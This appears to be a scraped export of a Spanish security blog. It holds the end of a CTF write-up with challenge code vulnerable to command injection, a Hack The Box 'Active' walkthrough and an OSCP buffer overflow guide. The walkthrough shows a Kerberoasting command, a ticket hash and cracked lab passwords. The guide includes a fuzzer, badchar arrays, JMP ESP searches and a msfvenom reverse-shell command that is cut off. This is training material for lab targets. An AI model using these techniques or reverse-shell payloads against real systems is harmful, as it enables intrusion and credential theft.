cd .. ls -la total 44 drwxr-sr-x 1 ctf ctf 4096 May 18 23:00 . drwxr-xr-x 1 root root 4096 Mar 3 15:18 .. drwxr-sr-x 6 ctf ctf 4096 May 18 22:57 5pSXN8iJRdGc7Y8nk5oNcKcrJKFTPK21 -rwxrwxr-x 1 root root 3166 May 12 23:51 artifacts.py -rw-rw-r-- 1 root root 263 May 12 23:32 clear.py -rw-rw-r-- 1 root root 38 May 12 17:37 flag.txt drwxr-sr-x 6 ctf ctf 4096 May 18 22:55 kPeKQsYEx9Z6ZKkBrdtWmQKdS98CURJl drwxr-sr-x 6 ctf ctf 4096 May 18 22:54 kWHPODHQFKSletaDKHB2AgJslbm6fwbb drwxr-sr-x 6 ctf ctf 4096 May 18 23:00 tHV1tdX82QcPllglF8wa6AhU24FRZS4S drwxr-sr-x 6 ctf ctf 4096 May 18 22:55 wqVpR4QLSsuu5QiWRqhPNLuYh2aHzlaI  FLAG: HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}\n Composición Como parte del ejercicio \u0026ldquo;post-reto\u0026rdquo; se extrajo el código correspondiente al reto (artifacts.py y clear.py).\nartifacts.py #!/usr/bin/python3 import os, random from termcolor import colored whitelist = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.\u0026#39;#/ \u0026#34; PATH = \u0026#34;./\u0026#34; sub_array = [\u0026#34;Head\u0026#34;, \u0026#34;Torso\u0026#34;, \u0026#34;Hands\u0026#34;, \u0026#34;Legs\u0026#34;] # Create random directory def rand_dirname(length=32): charset = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; dirname = \u0026#34;\u0026#34; while len(dirname) \u0026lt; length: dirname += random.choice(charset) return dirname def check_filename(filename): return all(i in whitelist for i in filename) def change_sub_dir(idx, color): print(colored(f\u0026#34;\\n[*] Sub-directory to work in: {dirname}/{sub_array[idx]}\\n\u0026#34;, color)) os.chdir(PATH + sub_array[idx]) def subjects(): subs = \u0026#34;\u0026#34;\u0026#34;\\nComponent List: +===============+ | | | 1. Head 🤖 | | 2. Torso 🦴 | | 3. Hands 💪 | | 4. Legs 🦵 | | | +===============+ \u0026#34;\u0026#34;\u0026#34; print(colored(subs, \u0026#34;magenta\u0026#34;)) ans = int(input(colored(\u0026#34;[*] Choose component: \u0026#34;, \u0026#34;magenta\u0026#34;))) if ans == 1: change_sub_dir(0, \u0026#34;blue\u0026#34;) elif ans == 2: change_sub_dir(1, \u0026#34;green\u0026#34;) elif ans == 3: change_sub_dir(2, \u0026#34;cyan\u0026#34;) elif ans == 4: change_sub_dir(3, \u0026#34;yellow\u0026#34;) else: print(colored(\u0026#34;\\n[-] Invalid option!\\n\u0026#34;, \u0026#34;red\u0026#34;)) exit() def menu(): m = \u0026#34;\u0026#34;\u0026#34; Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit \u0026#34;\u0026#34;\u0026#34; print(colored(m, \u0026#34;yellow\u0026#34;)) return int(input(colored(\u0026#34;[*] Choose action: \u0026#34;, \u0026#34;yellow\u0026#34;))) def create_file(): fname = input(colored(\u0026#34;Insert name: \u0026#34;, \u0026#34;yellow\u0026#34;)).strip() if not check_filename(fname): print(colored(\u0026#34;\\n[-] Invalid name!\\n\u0026#34;, \u0026#34;red\u0026#34;)) exit() os.system(f\u0026#34;touch {fname}\u0026#34;) contents = input(colored(\u0026#34;\\nInsert content: \u0026#34;, \u0026#34;yellow\u0026#34;)) f = open(fname, \u0026#34;a\u0026#34;) f.write(contents) f.close() print(\u0026#34;\\n\u0026#34;) print(colored(f\u0026#34;[+] Artifact [{fname}] was created successfuly!\u0026#34;, \u0026#34;green\u0026#34;)) def zip(): zip_name = input(colored(\u0026#34;Insert \u0026lt;name\u0026gt;.zip: \u0026#34;, \u0026#34;blue\u0026#34;)).strip() files = input(colored(\u0026#34;Insert \u0026lt;name\u0026gt;: \u0026#34;, \u0026#34;blue\u0026#34;)).strip() options = input(colored(\u0026#34;Insert \u0026lt;options\u0026gt;: \u0026#34;, \u0026#34;blue\u0026#34;)).strip() if not check_filename(zip_name) or not check_filename(files) or not check_filename(options): print(colored(\u0026#34;\\n[-] Invalid name!\\n\u0026#34;, \u0026#34;red\u0026#34;)) exit() os.system(f\u0026#34;zip {zip_name}.zip {files}{options}\u0026#34;) # Create directory dirname = rand_dirname() print(colored(f\u0026#34;\\n[*] Directory to work in: {dirname}\u0026#34;, \u0026#34;cyan\u0026#34;)) os.mkdir(PATH + dirname) os.chdir(PATH + dirname) os.system(\u0026#34;mkdir -p Head Torso Hands Legs\u0026#34;) ans = subjects() while True: # Choose action act = menu() print(\u0026#34;\\n\u0026#34;) if act == 1: create_file() elif act == 4: zip() elif act == 3: fname = input(\u0026#34;Insert name you want to read: \u0026#34;).strip() os.system(f\u0026#34;cat ./{fname}\u0026#34;) elif act == 2: os.system(\u0026#34;pwd; ls -la\u0026#34;) elif act == 6: os.system(\u0026#34;rm -rf ./*\u0026#34;) elif act == 5: os.chdir(f\u0026#34;../../{dirname}\u0026#34;) ans = subjects() else: print(colored(\u0026#34;\\n[-] Invalid option!\\n\u0026#34;, \u0026#34;red\u0026#34;)) os.system(\u0026#34;rm -rf ./*\u0026#34;) exit() clear.py import os os.system(\u0026#39;ls -la \u0026gt; temp\u0026#39;) f = open(\u0026#39;temp\u0026#39;, \u0026#39;r\u0026#39;) for line in f: arr = line.split() try: if len(arr[8]) \u0026gt; 16: os.system(f\u0026#39;rm -rf {arr[8]}\u0026#39;) except: print(\u0026#39;\u0026#39;) print(f\u0026#39;[+] Directories have been deleted!\\n\u0026#39;) os.system(\u0026#39;rm -f ./temp\u0026#39;) Conclusión En lo personal encontré el CTF bastante divertido y me permitió explorar cosas que hasta el momento no había podido tocar como lo fueron los retos de forense, enfocados más al lado de Blue Team. Como ejercicio para práctica futura y de aprendizaje guardé los retos y sus archivos en este repositorio para poder resolverlos siguiendo los write-ups públicos y aprender de ellos.\n","permalink":"https://rzul.me/posts/htb-cyber-apocalypse-2022/","summary":"Intro El CTF de Cyber Apocalypse volvió este año, bajo una temática intergaláctica estando disponible del 14 al 20 de Mayo del 2022. Mediante este enlace se puede obtener más información del evento.\nAquí se encuentran las soluciones de los retos que pude resolver durante mi participación.\nEl write-up aquí presente fue generado por medio de CTFScrapper para la creación de un entorno de trabajo y para la descarga de los archivos de los retos, disponibles en mi compendio de retos.","title":"HTB Cyber Apocalypse 2022"},{"content":"Estadísticas    Característica Descripción     Nombre Active   OS Windows   Dificultad oficial Easy   Dificultad de comunidad    Puntos 20   Creadores eks \u0026amp; mrb3n    Reconocimiento Escaneo de host Escaneo completo de puertos ❯ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/allPorts $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:29 EST Initiating Connect Scan at 20:29 Scanning 10.10.10.100 [65535 ports] Discovered open port 135/tcp on 10.10.10.100 Discovered open port 445/tcp on 10.10.10.100 Discovered open port 53/tcp on 10.10.10.100 Discovered open port 139/tcp on 10.10.10.100 Discovered open port 49152/tcp on 10.10.10.100 Discovered open port 464/tcp on 10.10.10.100 Discovered open port 49157/tcp on 10.10.10.100 Discovered open port 593/tcp on 10.10.10.100 Discovered open port 3269/tcp on 10.10.10.100 Discovered open port 49165/tcp on 10.10.10.100 Discovered open port 88/tcp on 10.10.10.100 Discovered open port 49167/tcp on 10.10.10.100 Discovered open port 3268/tcp on 10.10.10.100 Discovered open port 389/tcp on 10.10.10.100 Warning: 10.10.10.100 giving up on port because retransmission cap hit (2). Discovered open port 49155/tcp on 10.10.10.100 Discovered open port 636/tcp on 10.10.10.100 Discovered open port 49158/tcp on 10.10.10.100 Discovered open port 49154/tcp on 10.10.10.100 Discovered open port 5722/tcp on 10.10.10.100 Discovered open port 49153/tcp on 10.10.10.100 Discovered open port 49166/tcp on 10.10.10.100 Discovered open port 9389/tcp on 10.10.10.100 Completed Connect Scan at 20:29, 28.58s elapsed (65535 total ports) Nmap scan report for 10.10.10.100 Host is up, received user-set (0.065s latency). Scanned at 2022-01-19 20:29:16 EST for 29s Not shown: 63369 closed tcp ports (conn-refused), 2144 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack 88/tcp open kerberos-sec syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 389/tcp open ldap syn-ack 445/tcp open microsoft-ds syn-ack 464/tcp open kpasswd5 syn-ack 593/tcp open http-rpc-epmap syn-ack 636/tcp open ldapssl syn-ack 3268/tcp open globalcatLDAP syn-ack 3269/tcp open globalcatLDAPssl syn-ack 5722/tcp open msdfsr syn-ack 9389/tcp open adws syn-ack 49152/tcp open unknown syn-ack 49153/tcp open unknown syn-ack 49154/tcp open unknown syn-ack 49155/tcp open unknown syn-ack 49157/tcp open unknown syn-ack 49158/tcp open unknown syn-ack 49165/tcp open unknown syn-ack 49166/tcp open unknown syn-ack 49167/tcp open unknown syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds Escaneo específico ❯ nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49165,49166,49167 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:30 EST Nmap scan report for 10.10.10.100 Host is up (0.066s latency). PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-01-20 01:37:18Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC 49166/tcp open msrpc Microsoft Windows RPC 49167/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.1: |_ Message signing enabled and required | smb2-time: | date: 2022-01-20T01:38:13 |_ start_date: 2022-01-20T01:34:15 |_clock-skew: 6m45s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70.52 seconds Enumeración Servicios smb - 445 Manual Se identificaron folders compartidos haciendo uso de smbclient de los cuales se permitia el acceso anónimo al share de Replication.\nAl conectarse al directorio compartido de Replication se usaron los comandos:\n prompt off - Para deshabilitar la confirmación al descargar cualquier archivo. recurse on - Para habilitar la recursividad si se llega a encontrar un directorio. mget * - Para descargar todos los archivos y directorios disponibles.  Se identificó un archivo el cual expone un usuario y un hash disponible para crackear.\nContenido de Groups.xml:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; Explotación Descrifrado de GPP Ejecución Al identificar qué tipo de credencial es la que se encuentra en Groups.xml se identificó una vulnerabilidad relacionada con las Group Policy Preferences, dado el leak de la llave y suponiendo que la máquina no se encuentra parchada se puede descifrar la contraseña haciendo uso de gpp-decrypt.\nKerberoasting Ejecución Dados los puertos abiertos que tiene la máquina se puede intuir que la máquina objetivo es un Domain Controller, contemplado esto y que se cuenta con credenciales se puede hacer uso de impacket-GetUserSPNs para buscar conseguir un hash de alguna otra cuenta que permita el acceso a la máquina. Comando completo: impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request.\nAl identificar el error de sesión señalado debido a que la hora de la máquina no corresponde con la que se utiliza, se ocupa ntpdate para sincronizar la hora local con la de la máquina objetivo, señalando que el único comportamiento funcional encontrado fue utilizando el hostname de la máquina por lo que se modificó /etc/hosts para añadir la entrada del hostname con la IP, configurando así la hora local.\nPosteriormente se ejecutó de nuevo la herramienta de impacket para obtener el hash.\nHash obtenido:\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b9225835ed0789a77d29228e13c82766$9bf95664d6316261f490688514dadd5470eb70fed87666be26d2e2fbe30691d7ce3377cf176e3bb2e0d459a6a7d25153e89ef9a44d13e16012e3ba81bc3b19a84653d112df3c4e21329bed80b91938da785d8aed471821a4c990559930aee3312e70cccdbbeb52c3c454c4d4b712c9ebf66602062bfc993d7de4c4250f8706a98b75109467a74522538816a92d462c8e7279556c4f3e4f9fe8447d326876fa169608c143847436fb761b2f0aa5122b90f5af045b73a1d2fa2a7e9f432fab538302dc6575d1d5095e89e7d66febce084b6fad6deb79cbd1db17f7cbd49907b0bed27958ade09ef2ed7baaf1e18d5d368c5c29aa614e8584669dd8d6a4d52bdebabfdaa48b68b4db41411aef874ea76c301b9fff65f81c48822e263530b788cc75231fdd78c3879ad254e92edbe4b7efb8909d37ec1699f58b75a32b73da4fca77ae566d5b3c1b1ae67a74cae08988429d54694bc1f3030cbc5aa59113b35129a98f2c32d6faa69816facb1153327d242019a5a2aad1ba5420449421a39b6a250e424ed9d8863edb0429ff54d33df78d3bed41ac41ca509250750cfc4db6dc91ced953db230554b681fd5569407664542f2fac85f3d385ca42038c9d8e7eaacfe07dd480efeeb6843127d084b0a08be254bfe9166e810108590e7e064bbe36e3d3a6faf5d05fab1015536cc34b8cdc27d80450a0b139bcd8ece127c6600218c3d1a75558aac8bf3094a5ca6d98bfc309b89d7e7fb1a03df601d98be07e26fa746629a5fa7492e489154348dcfd29800ab9fc49bb793a430510564a8525da693112b9243a4840b59360e7ca1d449f5faf35a15aa4902d94c1ed0dca1b3d8c0ea083f4c823f17c730c9bfbdb9c93abc9250cdface8a4da66da5c6868c4de96f344c4102ab56be8385237a0755ac26a8f7119fc55e698748c14ae37ec11c8a4e534e2ebf99c12877b64bf9ef636d487afee40de5115a5aff0f8ca7a2f059b4e56db5dea6069fc56ece3bd63d47b13889cad441635f6ac03d5688ea7041811ff55a462e0292bfe1f234b8a5994dd8efe0b4fde336d4815026e80ae3f96a9d025db0d9ba55183ed2a53e8b3f002e3aa5d3f744f8b46322dba0918130fc0b7f4a85342cae3a14fc9a555983668dd5c7ad63934a407e7a055c610b371bf3772c8e85b173ab9bdb22f76e9fbef451678abfb3db0a300d0c18db7ba907536d1dc3008b4488fee3d4bde9e8d719001bb7ebdf66df8f18132eb9d2d867d207bcb Lo que resultaría en buscar el crackeo del hash obtenido (ejecutándolo en esta ocasión usando john) para poder obtener acceso a la máquina, haciendo uso de impacket-psexec proporcionando las credenciales obtenidas.\nCredenciales obtenidas    Alcance Usuario Contraseña (hash → pass) Fuente     SO SVC_TGS edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ → GPPstillStandingStrong2k18 smb (Groups.xml) + gpp-decrypt   SO Administrator $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b92258... → Ticketmaster1968 impacket-GetUserSPNs + cracking    ","permalink":"https://rzul.me/posts/htb-active/","summary":"Estadísticas    Característica Descripción     Nombre Active   OS Windows   Dificultad oficial Easy   Dificultad de comunidad    Puntos 20   Creadores eks \u0026amp; mrb3n    Reconocimiento Escaneo de host Escaneo completo de puertos ❯ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/allPorts $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Active"},{"content":"OSCP Metodología Stack Based Objetivo Como parte de la práctica para el examen me di a la tarea de realizar esta guía para futuras consultas y aclaración de dudas, esperando que sirva de ayuda para cualquiera que se este preparando para la certificación. Adicional, para tener un compendio más práctico realice un síntesis de los comandos utilizados disponibles en esta Cheat Sheet.\nConfiguración de ambiente de práctica  Deshabilitar firewall y/o habilitar reglas para comunicación a través de red. Deshabilitar protección DEP de Windows. Instalación de herramientas (binario, immunity debugger, mona.py). Generación de workspace para mona.py.  Firewall Traza ICMP En la sección de configuración avanzada habilitar reglas tanto de entrada como de salida de ICMP v4 y v6 para permitir comunicación entre la máquina que se ocupará para debuggear el binario y la máquina de donde se lanzará el exploit.\nDeshabilitado de DEP En un command prompt como administrador ejecutar: bcdedit.exe /set {current} nx AlwaysOff para deshabilitar la prevención de ejecución de datos (DEP). Después de ejecutarlo y reiniciar el sistema se puede validar que se deshabilitó correctamente entrando a Panel de Control \u0026gt; Sistema y seguridad \u0026gt; Sistema \u0026gt; Configuración avanzada del sistema \u0026gt; Opciones avanzadas \u0026gt; Configuración (de rendimiento) \u0026gt; Prevención de ejecución de datos este deberá salir sombreado de gris.\n Configuración avanzada del sistema. Configuración de rendimiento. Pestaña de prevención de ejecución de datos. Sombreado gris de correcto deshabilitado.  Instalación de herramientas (Mona) Para añadir el script de mona.py a inmmunity debugger, es necesario descargar el script del repositorio y meterlo en la ruta C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\PyCommands.\nGeneración de workspace para mona.py (opcional) Para facilitar el uso de mona.py, se puede generar un entorno de trabajo (a secas es una carpeta) que contendría lo que mona.py genere a partir de los comandos que se utilicen (payloads, patrones, badchars, etc). Ejecutando !mona config -set workingfolder C:\\Users\\SrRequiem\\Desktop\\%p se indicaría el lugar y a partir del primer comando de mona.py que genere archivos, se podrá ver reflejado en el sistema de archivos.\nFuzzing En esta sección se realiza la búsqueda del punto de quiebre del binario. Identificando el número de caracteres que causen un fallo de segmentación.\nPlantilla de fuzzer #from pwn import * import socket, sys, time if len(sys.argv) \u0026lt; 2: print \u0026#34;\\n[!] Uso: python \u0026#34; + sys.argv[0] + \u0026#34;\u0026lt;ip-address\u0026gt; \u0026#34; + \u0026#34;\u0026lt;remote-port\u0026gt;\\n\u0026#34; sys.exit(0) # Variables globales ip_address = sys.argv[1] rport = int(sys.argv[2]) if __name__ == \u0026#39;__main__\u0026#39;: contador = 100 #p1 = log.progress(\u0026#34;Data\u0026#34;) Log de datos en pwntools while True: #p1.status(f\u0026#34;Enviando {contador} bytes.\u0026#34;) Log de datos en pwntools print \u0026#34;Enviando %sbytes.\u0026#34; % contador buffer = \u0026#39;A\u0026#39; * contador try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip_address, rport)) data = s.recv(1024) #s.send(\u0026#34;USER srrequiem\\r\\n\u0026#34;) #data = s.recv(1024) s.send(\u0026#34;%s\\r\\n\u0026#34; % buffer) data = s.recv(1024) contador += 100 #En algunas ocasiones no suele romperse la conexion lo que evita entrar #al codigo de la excepcion por lo que se puede considerar meter un sleep #para visualizar en que valor de la iteracion se pausa la ejecucion del binario time.sleep(1) except Exception as ex: print \u0026#34;\\n[!] Ha habido un error de conexion\\n\u0026#34; print ex sys.exit(1) Por medio del script se puede buscar el cambio del EIP de manera automática.\nGeneracion de patrón\nmsf-pattern_create -l \u0026lt;longitud de bytes\u0026gt;\n!mona pattern_create \u0026lt;longitud de bytes\u0026gt;\nDespués de provocar el fallo con el patrón, la dirección EIP se sustituiría con un valor del segmento de nuestro patrón. El valor que contenga EIP ahora lo identificaremos para saber el offset específico.\nIdentificación offset\nmsf-pattern_create -l \u0026lt;EIP\u0026gt;\n!mona pattern_offset \u0026lt;EIP\u0026gt;\n Offset. EIP.  Nota: Siempre corroborar con un payload propio modificando después del offset un valor que se identifique facilmente. Ejemplo: 1052 \u0026lsquo;A\u0026rsquo; y 4 \u0026lsquo;B\u0026rsquo; en este caso el EIP valdría 42424242\nIdentificar Bad Chars Manual Si bien es bueno saber el proceso que se realiza, es una tarea que consume mucho tiempo y que existe una gran posibilidad de cometer errores al realizarlo ya que es muy fácil perder algún byte de vista muy fácil.\nEl proceso se centra en enviar el payload con los badchars y directamente seguir los caracteres ASCII obtenidos del ESP y buscar cuales son los que no se visualizan correctamente, identificandolos así uno a uno. Se puede generar la colección de bytes con mona.py con el comando !mona bytearray dentro de Immunity Debugger para tener la colección y poder incorporarla al payload.\nColección plana \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\nColección en arreglo badchars = ( \u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\u0026#34; \u0026#34;\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\u0026#34; \u0026#34;\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\u0026#34; \u0026#34;\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\u0026#34; \u0026#34;\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\u0026#34; \u0026#34;\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\u0026#34; \u0026#34;\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\u0026#34; \u0026#34;\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\u0026#34; \u0026#34;\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; ) Después de enviar el payload con los badchars y lograr la pausa del programa podemos seguir el contenido del ESP dándo click derecho en el registro y seleccionando la opción Follow in Dump, de la sección ubicada en la esquina inferior izquierda se nos desplegará el contenido del registro para poder identificar los badchars manualmente.\nSe anexan ejemplos de cómo se verían los badchars en el dump de hexadecimal (sección inferior izquierda de Immunity Debugger).\nAutomático El proceso se puede optimizar usando mona.py de manera iterativa, con los siguientes comandos mona.py nos devolverá los badchars identificados.\n !mona bytearray: Generará archivos con arreglo de badchars. !mona compare -f \u0026lt;ubicacion de byte array .bin\u0026gt; -a \u0026lt;dirección de ESP\u0026gt;: Comparará los badchars contenidos respecto al payload ubicado en el ESP (recordando que payload = filler + eip + badchars). !mona bytearray -cpb '\\x00': Generará archivos con arreglo de badchars exceptuando los indicados. Repetir proceso hasta encontrar todos los badchars.  Búsqueda de dirección Aquí se realiza la búsqueda de la instrucción JMP ESP (valores hexadecimales \\xff\\xe4) en las dlls del binario, siempre tratando de identificar aquellas que no cuenten con protecciones (todas la banderas dadas por mona.py en False).\nNota: se puede hacer uso de msf-nasm_shell para ver el valor de los OP codes (en este caso jmp ESP) en caso que se requiera.\nComando de mona.py\n!mona modules\nEjemplo\nBúsqueda de apuntador en dll Aquí se realiza una búsqueda de los apuntadores contenidos en la dll identificada con el valor de la instrucción \\xff\\xe4.\nComando de mona.py\n!mona find -s \u0026quot;\\xff\\xe4\u0026quot; -m \u0026lt;nombre de dll\u0026gt;\nSe desplegará una lista de direcciones de memoria que se pudieran utilizar, sin antes considerar 2 cosas. La descripción de la tabla contenerá direcciones con permisos de lectura y ejecución (PAGE_EXECUTE_READ); y de escritura solamente (PAGE_READ_ONLY), hay que tomar en cuenta sólo aquellas que cuenten con ejecución (PAGE_EXECUTE_READ). Y también desplegará las protecciones con las que cuenta la dll, tomar de nuevo en cuenta aquellas que tengan todo deshabilitado (False).\n Comando. Direcciones útiles para usar en EIP (buscar aquellas que en el valor de la dirección no contenga ningún badchar). Permisos. Protecciones.  Generación de shellcode Aquí se generará el shellcode a utilizar después de la sustitución del valor que se asigne a la EIP.\nComando de ejemplo\nmsfvenom -a x86 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=\u0026lt;ip\u0026gt; 